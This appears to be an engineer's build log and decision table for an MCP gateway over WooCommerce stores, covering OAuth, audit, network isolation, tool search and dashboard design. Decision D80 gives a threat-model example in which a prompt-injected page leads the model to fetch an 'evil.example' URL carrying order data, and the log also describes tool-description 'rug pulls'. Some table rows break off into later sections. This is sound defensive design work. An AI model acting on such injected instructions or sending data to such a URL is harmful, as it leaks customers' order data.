#### Verified by experiment: WooCommerce REST authentication over plain HTTP
- WooCommerce accepts Basic auth only over HTTPS. Over HTTP it requires **OAuth 1.0a**.
- I tested the signature variants against the live store:
  - **Standard RFC 5849 signing works**, including values with `:` such as ISO dates. Single-encoding the values, as I suspected WooCommerce might, fails with 401.
  - **The signature base URL must be WordPress's *home URL*** (`http://shop.127.0.0.1.nip.io/wp-json/...`), **not the in-cluster Service URL** the request is sent to (`http://wordpress:8080/...`). Signing with the Service URL returns `401 Invalid signature`. WooCommerce rebuilds the base string with `get_home_url()`.
- So woo-mcp **sends** requests to `WOO_BASE_URL` (Service) and **signs** them with `WOO_PUBLIC_URL` (home URL).

### Step 2: WooCommerce MCP server (`apps/woo-mcp`)
- **8 tools**: `get_store_info`, `list_products`, `get_product`, `create_product`, `list_orders`, `get_order`, `update_order_status`, `sales_summary`. The brief asked for 5; the extra 3 make the chat agent's job easier ("what does today mean?", "compare revenue across stores").
- Stateless Streamable HTTP via `createMcpHandler(factory, { legacy: 'stateless' })` from SDK v2, which builds a fresh `McpServer` per request. **Verified with a real MCP client in both eras**: a 2026-07-28 client (`server/discover`, no initialize) and a 2025 client (initialize handshake) both list and call tools.
- **Reachable only inside the cluster**: a ClusterIP Service with no Ingress, plus a NetworkPolicy that allows only `platform/gateway` pods. Verified: a curl pod in another namespace times out on both `woo-mcp` and `wordpress`.
- **Defense in depth**: the gateway must also present a static bearer token (Secret `woo-mcp-auth`), compared in constant time. Any request with a browser `Origin` header is rejected, which blocks DNS rebinding and confused-deputy attacks.
- Verified live:
  - `create_product` creates a product that shows up on the storefront.
  - A second call with the same SKU returns `created:false, reason:sku_exists`.
  - `list_orders period=today` finds the test order, with the email masked.
  - `update_order_status` moves processing to completed and adds a note.
  - `sales_summary` works.
  - Errors: a bad price fails schema validation, a bad order id returns WooCommerce's "Invalid ID" as an `isError` result, and a bad token gets HTTP 401.
- 17 unit tests:
  - OAuth signing, checked against a **hand-written** RFC 5849 base string.
  - Timezone periods, including an IST date that differs from the UTC date and a month boundary.
  - The HTTP surface: 401, 403 on Origin, tools/list, tools/call.
- One Dockerfile for all Node services (`images/node-app/Dockerfile`, `--build-arg APP=…`). It uses `pnpm fetch` for a cached dependency layer, esbuild bundles to one file, and runtime is `node:24-alpine` as UID 1000.

The core of the assignment. Module map:

|---|---|

| `mcp/upstream/connection.ts` | One MCP client per upstream. **Era-aware**: probes `server/discover` (2026-07-28) and falls back to `initialize` (2025). |

| `mcp/endpoint.ts` | Stateless `/mcp` (both eras); `tools/list` from memory; `list_changed` pushed to listening clients |
| `auth/bearer.ts` | API keys, OAuth access tokens and delegation tokens all resolve to one `Principal` |
| `auth/oauth/*` | The OAuth 2.1 AS: PRM, AS metadata, authorize, token, DCR, CIMD, revoke |
| `api/*` | Dashboard REST: auth, invites, members, keys, servers, tools approval, audit (+SSE, CSV, summary), permissions, OAuth consent and grants, chat proxy |

**Verified with two executable scripts against the real store** (`e2e/scripts/gateway-flow.ts`: 23 checks; `e2e/scripts/oauth-flow.ts`: 23 checks; all pass):
- Admin creates a product over MCP and it appears on the storefront.
- A member (connecting with a **2025-era** client) sees only read tools, gets "Unknown tool" for `create_product`, and that attempt is audited as `denied`.
- Disable a server and its tools vanish; a listening modern client gets `list_changed` **pushed**. Re-enabling restores them.
- A revoked key gets 401 immediately and the attempt is audited against that key.
- Search mode finds `sales_summary` for "how much revenue did we make today".
- OAuth:
  - discovery chain, DCR, PKCE enforced;
  - wrong `resource` refused; bad redirect never redirected;
  - `iss` returned;
  - code replay revokes the grant; refresh rotation, and reuse revokes the family;
  - MCP call audited with `auth_method=oauth` and the client name.

| # | Decision | Why |
|---|---|---|
| D22 | **No ORM**: postgres.js tagged-template SQL plus hand-written migrations (the plan said Drizzle) | The interesting parts are SQL-native: advisory locks, LISTEN/NOTIFY, an append-only grant on the audit table, deferrable constraints. Tagged templates are still fully parameterised (no injection), and there's one less abstraction to explain. |
| D23 | **Append-only audit at the DB level**: migrations run as the schema owner (initContainer); the app runs as `urumi_app`, which has no UPDATE/DELETE on `audit_events` | A compromised gateway still can't erase its tracks. Retention would be a separate role or job. |
| D24 | Audit write failure **does not** fail the user's call; it logs `AUDIT WRITE FAILED` at error level | Availability over completeness for a team tool. The tradeoff is documented: a stricter deployment could fail closed. |
| D25 | **Leader election** (pg advisory lock on a reserved connection) for health checks and tool sync; every replica serves calls | One writer means no status flapping when replicas disagree, and no thundering herd of health checks. Followers learn changes via NOTIFY. |
| D26 | Health hysteresis: a *connected* server needs **2** consecutive failures before it's marked unreachable; a *new* server fails fast on the first | One network blip shouldn't make tools vanish, but a typo in a new URL should be reported immediately |
| D27 | **TOFU tool approval**: on first sync, tools are auto-approved (the admin vetted the server by registering it) **unless** hygiene flags them. Any later definition change hides that tool until an admin re-approves it, with a before/after diff. | Keeps the DoD flow one-click while still blocking "rug pulls" (a server silently changing a tool's description after approval) |
| D28 | `tools/list` returns `ttlMs: 10000, cacheScope: "private"` | The list depends on the caller's permissions, so it must never be shared. A short TTL means non-listening clients notice a disabled server quickly. *Found by testing*: the SDK client honours `ttlMs`, and my first e2e run read a stale cached list. |
| D29 | Unknown, hidden and forbidden tools all return the same JSON-RPC `-32602 Unknown tool` | No enumeration of tools you can't use. The audit still records `denied` vs `UNKNOWN_TOOL`. |
| D30 | In **full** mode `tools/list` also includes `gateway__list_servers`; in **search** mode only the 3 meta-tools plus admin-pinned tools | Search mode changes only *listing*: any permitted tool is still callable by its exposed name |
| D31 | Read/write classification is **admin-owned** (`upstream_tools.access`), initialised from `readOnlyHint` | Annotations come from an untrusted server: they're a suggestion the UI shows, not a security boundary. Members default to "read" tools; explicit allow/deny rules override (deny wins). |
| D32 | Bootstrap seeds one permission rule: `role:member allow fetch/*` | The reference fetch server doesn't set `readOnlyHint`, but it only reads the web, and the DoD's member needs it for cross-server prompts |
| D33 | OAuth tokens are **opaque** (`uat_`/`urt_`/`udt_` prefixes) and stored as HMAC | Instant revocation, with no JWT key management. The cost is one DB lookup per request, which a 5 s cache plus NOTIFY invalidation covers. |
| D34 | Consent is shown for every authorization; "Verified" only for CIMD clients whose redirects aren't localhost-only | DCR clients can claim any name, so the UI must not imply it's really "Claude" |
| D35 | Codes are 2-minute, single-use, flipped atomically with `UPDATE … WHERE used_at IS NULL RETURNING`. A failed PKCE attempt also burns the code. | No race window for double redemption |

**Bugs found by testing (and fixed):**
1. The PATCH schema for servers had `authType` with a zod `.default('none')`, so toggling `enabled` silently **wiped the credential**. The status badge correctly showed `AUTH_REJECTED`, which is how I spotted it. Fix: no defaults on update schemas.
2. The CSRF middleware rejected bodyless DELETEs with 415. It now checks the content type only when a body is present.
3. The pnpm lockfile had a broken peer-resolution entry for vitest. Fixed with `pnpm install --fix-lockfile`.

```

agent --Bearer udt_…--> gateway /mcp  (same permission check + audit as any MCP client; via=chat)
agent --SSE--> gateway --SSE--> browser
```

**Bugs found by testing (and fixed):**
1. **Rug pulls were caught only by the periodic sync, not instantly.** The gateway reconnects to known upstreams with a cached `prior` discovery (it skips the version probe). In MCP SDK 2.3.1, that path registers the list-changed handlers but **never opens the `subscriptions/listen` stream**; only a from-scratch negotiation does. So `notifications/tools/list_changed` never arrived. I proved it with a two-client script against the chaos server: the fresh client got the event, the `prior` client didn't. The SDK also never re-opens a dropped stream. The fix:
   - The connection opens the subscription when the SDK hasn't.
   - When the stream ends unexpectedly, it drops the client and triggers a sync. That reconnects, and the sync catches anything missed while disconnected. A stream that dies within 30 s isn't retried immediately, to avoid a reconnect storm.
   - The health tick re-opens a missing subscription.
   - Result: a rug pull is now hidden in **about 1 second** with no nudge. It is verified after restarting the upstream pod mid-test, and the e2e check now asserts the push path.
2. **The rug-pull test left state behind.** Undoing the rug pull is itself a definition change after the admin approved the new text, so the gateway (correctly) quarantined echo again. The next run then "rug-pulled" back to the approved text, and nothing was hidden. The test now resets echo to a known approved baseline before and after.
3. **The e2e port-forward raced the local testkit.** Both bound port 18101, so chaos admin calls could hit the wrong server. e2e now uses 18191 and waits for the forward to be ready instead of `sleep 2`.
4. Chart parse errors: a `define` inside an `if` in `networkpolicies.yaml`, and the recursive checksum (D59). Helpers moved to `_helpers.tpl`.

**Verified:**
- The full stack on k3d: all pods Running under restricted Pod Security, migrations ran as the owner, and bootstrap created the admin plus `woo` and `fetch`.
- `woo` connected across namespaces through the NetworkPolicies, using the copied token.
- SSRF probes against cluster-internal addresses get 422.
- `make e2e`: gateway-flow, oauth-flow, resilience-flow and chat-flow all pass, repeatedly. Gateway unit tests: 4. Agent unit tests: 11.

**Bugs found by testing (and fixed):**
1. **Killing the provisioner mid-install made the store `Failed`.** I expected a killed Helm run to leave the release `pending-install`, which was handled. But **Helm 4 catches SIGTERM** and marks the release `failed` with "context canceled", so the reconciler reported a real failure. It now treats that description as an interruption and reinstalls. The test, run twice: create a store, wait for `Installing`, `kubectl delete pod` the provisioner. 2. **`sales_summary` reported no currency for a store with no orders** in the period. It took the currency from the first order. A "compare stores" answer then mixed "2397 INR" with a bare "0". It now falls back to the store's configured currency.
3. A brand-new provisioner pod's first API calls fail ("fetch failed") until its NetworkPolicy rules are programmed. The queue's backoff absorbs this within a second or two, so it's left as is and noted.
4. `.dockerignore` excluded `charts/`, so the provisioner image (which bakes in the store chart) didn't build. Added `!charts/store`.

**Process note:** my first isolation test used `wget` and reported the store's *own* WordPress as blocked. That was a false negative: WordPress redirected to its public hostname, which is 127.0.0.1 inside the pod. Isolation is now tested at the TCP level (`nc -z`), so "blocked" means the connection was refused by policy.

### Step 8: The definition of done as one test, and the tool-search evaluation

**DoD walkthrough (`e2e/scripts/dod-flow.ts`, `make dod`; also first in `make e2e`).** The other suites each cover a slice. This one follows the assignment's DoD bullets in order, with two users: A (admin, dashboard chat) and B (invited member, an external MCP client with only the URL and a key). It checks:
1. **Store:** a shopper checks out with COD through WooCommerce's Store API (the same calls the block checkout makes). The script then logs into wp-admin and finds the order on its edit screen.
2. **Chat as A:** create a product (approval card → approve), see it on the storefront, buy it, then ask "what orders came in today?". The answer contains that order.
3. **External client as B:** A's client sees tools from every enabled server, and B sees the read tools. B's orders question returns both orders, and B calls `sales_summary` on two different stores.
4. **Revoke B's key:** a fresh request gets 401, and B's already-connected client is rejected on its next call.
5. **Disable `fetch`:** its tools vanish from A's client and from what the chat agent can pick, and the dashboard shows Disabled.
6. **Kill `chaos`'s pod:** a call to it fails in ~3 s with `CONNECTION_REFUSED`, and `woo` answers in ~70 ms meanwhile. The dashboard shows Unreachable, the tools are hidden, and it recovers on its own.
7. **Audit:** every call above is there with the right user (including B's revoked-key attempt), server, tool, time, duration and outcome.

| # | Decision | Why |
|---|---|---|
| D77 | The DoD's "kill the pod" step **scales the Deployment to 0** instead of deleting the pod | A Deployment replaces a deleted pod in about 2 s, which is faster than two health checks, so "Unreachable" might never show. Scaling to 0 kills the pod and keeps it down. `kubectl delete pod` also works if you watch the dashboard closely. |
| D78 | Local health interval **5 s** (`values-local.yaml`); the default stays 10 s | The dashboard flips to Unreachable within ~10 s of a pod dying, which reads well on camera. |
| D79 | Failed-auth audit rows now **snapshot the key owner's email** (`COALESCE(principal email, SELECT email FROM users WHERE id = owner)`) | *Found by the DoD test*: a revoked key's attempts were attributed by `user_id` only, so the audit page showed no name next to them. |
| D80 | `fetch` stays classified as a **write** in chat (approval required), even though it only reads the web | It declares no `readOnlyHint`, and the conservative default is the right one here. A fetch URL is an **exfiltration channel**: a prompt-injected page can make the model "fetch `https://evil.example/?d=<orders>`". **Tool-search evaluation (`eval/`, `make eval`, `make eval-offline`).** The plan called for one, and it found a real problem.
- `tool-search.jsonl` is the dev set: 66 natural-language tasks, mostly paraphrases that avoid the tool's own words. `tool-search.holdout.jsonl` is the held-out set: 35 tasks, written **before** any tuning and only ever looked at in aggregate.
- `run.ts` measures the live gateway through the full MCP path and writes `RESULTS.md`. `offline.ts` runs the gateway's real `ToolIndex` against `catalog.snapshot.json`, so ranking changes can be measured in a second.
- **Context cost:** full mode sends 326 tools (≈ 40k tokens) on every model call. Search mode sends 3 meta-tools (≈ 400 tokens), plus ≈ 700 per search. That's a 101× smaller standing context.
- **Finding:** the first version (plain BM25, name boost 3, prefix matching) **lost to a naive keyword-count baseline** on the dev set (hit@1 42% vs 48%). BM25 is blind to the verb: "start a performance review" scored `create_review`, `update_review` and `delete_review` the same, and ties sometimes put `delete_*` first.

| # | Decision | Why |
|---|---|---|
| D81 | **Light stemming** (plurals, -ing/-ed/-er, final -e) applied identically to the index and the query, instead of prefix matching | "couriers" → "courier", "scheduled" → "schedule". Consistency matters more than linguistics, and it's 15 lines with no dependency. |
| D82 | **Action-aware re-rank** on top of BM25: each tool's verb is read from its name (verb_noun, wherever the verb sits: `crm_create_deal`) and the query's intent from its action words. Matching verbs ×1.6, mismatched writes ×0.7; without a write intent, reads ×1.15, writes ×0.8, **deletes ×0.6** | It fixes the main failure mode generically. The safety default matters too: a gateway should never put `delete_contact` first for "the contact at Globex". |
| D83 | Function words (did, get, we, …) are no longer search terms | "how many orders did we get" matched every `get_*` tool |
| D84 | **Tune on dev, report both sets**, and keep the dev-chosen config even when an alternative scored better on held-out | Choosing by held-out score would make it a second dev set. The held-out set moved the same way as dev (hit@1 51% → 63%, hit@5 83% → 89%), which is the evidence the changes aren't overfitted. |
| D85 | `apps/gateway/test/search-eval.test.ts` runs the offline evaluation in CI with floors per set | Ranking changes are easy to make and hard to eyeball. This turns the eval into a regression guard. |
| D86 | Fixed woo-mcp's `sales_summary` description: it returned `average_order_value` without saying so | *Found by the eval* ("average order value this month" missed). The model can't use an output it doesn't know exists. |
| D87 | **Definition changes on platform-owned upstreams (`bootstrap`, `store/*`) are auto-approved** unless hygiene flags them; third-party servers still need re-approval | *Found while shipping D86*: under TOFU pinning, any woo-mcp upgrade hid the changed tools on **every store** until an admin re-approved them one by one. Platform servers are already pinned by the image tag the operator deploys, so re-approval adds friction without security. Rug-pull protection still applies to admin-registered servers (`resilience-flow` checks it with `chaos`). |

### Step 10: Hardening by breaking things on purpose

This step ran the system the way production would: two gateway replicas, real upgrades, a failed upgrade, a rollback and a restore. Almost every decision below came from something that broke during those runs.

| # | Decision | Why |
|---|---|---|
| D93 | **Per-user rate limit on tool calls**: a token bucket per user, in memory per replica (`gateway.rateLimitPerMinute`, default 120). It is checked before anything reaches an upstream. ### Step 12: Re-verification after a Docker restart, and NetworkPolicies that silently stopped working

The machine slept and Docker restarted, which stopped the k3d cluster and the local dev processes. After `k3d cluster start urumi`, every pod and both provisioned stores came back on their own, and the whole suite went green: typecheck clean, 66 unit tests (agent 11, gateway 25, woo-mcp 17, provisioner 13), and `make e2e` passing all 6 suites.

**`make isolation` failed: every path that should be blocked was open.**
- All 30 NetworkPolicies were present.
- The node had no kube-router chains in iptables and no ipsets.
- The k3s log for that boot had no `Starting network policy controller` line. On the first boot, that line came about 1 s after flannel started.

So the cluster *looked* isolated but enforced nothing. A plain `k3d cluster stop` / `start` brought the controller back about 2 s into the boot, and `make isolation` passed 16 of 16.

The likely cause is in k3s's startup. Before it starts the controller, it waits for the node's Ready heartbeat to be newer than the agent's start time, and that wait logs only at debug level. A clock jump from the sleep could leave it waiting with no visible trace. That part is inferred from the k3s source, not proven.

| # | Decision | Why |
|---|---|---|
| D105 | **Enforcement is proved by probes, not assumed from manifests.** On failure, `make isolation` now prints how to check the controller and how to restart it. There's a runbook row for the symptom. | Every e2e suite passed while nothing was enforced, because they test behaviour, not the network. Only TCP probes from inside the pods see the difference. The check costs about 20 s and belongs after any node restart, not just in CI. |

### Step 13: Dashboard redesign

The first dashboard worked, but it read like a form generator: a flat link list, buttons all of one weight, and `window.confirm` for destructive actions. Admins had to hunt for things. The redesign keeps every API call and page and changes how they look and where they sit. It takes its cues from the Vercel and Stripe dashboards: neutral grays, one accent, a monochrome primary button, and status shown as a dot plus a word.

**What changed:**
- **Type and color:** Geist and Geist Mono, self-hosted through fontsource so they load under `font-src 'self'`. The palette is built on CSS `light-dark()` tokens. Dark mode follows the OS by default; the account menu and the Account page can force Light or Dark per browser, stored in localStorage and applied before first paint, so there's no flash.
- **Finding things:** The sidebar is grouped into Gateway, Access and Team, and the Servers item shows a count when a server is down or tools need review. **⌘K** opens a command menu that reaches any page, any server, or an action like "Invite a member". Every "new" dialog has its own URL (`/servers?new=1`, `/keys?new=1`, and so on), so the command menu, empty states and Overview link straight to the form.
- **Overview first:** The "Needs attention" list names each problem and links to the fix: an unreachable server goes to its page, pending tools to `/servers/:id?tools=review`, a failed store to Stores. Next to it, a "Connect a client" card shows the MCP URL with per-client snippets.
- **Safer actions:** A styled confirm dialog (`useConfirm()`) replaces `window.confirm`, naming the target and the consequence. Server actions sit in a ⋯ menu. Tool review uses tabs (All, To review, Disabled).
- **Finished states:** Skeleton rows while loading, an empty state on each list with the next action in it, and callouts with Retry for failures.
- **Overlays:** Modal, Drawer and the command menu render in a portal on `document.body`. The page's enter animation uses a transform, which traps `position: fixed` children, so before the fix a modal's backdrop didn't cover the sidebar.
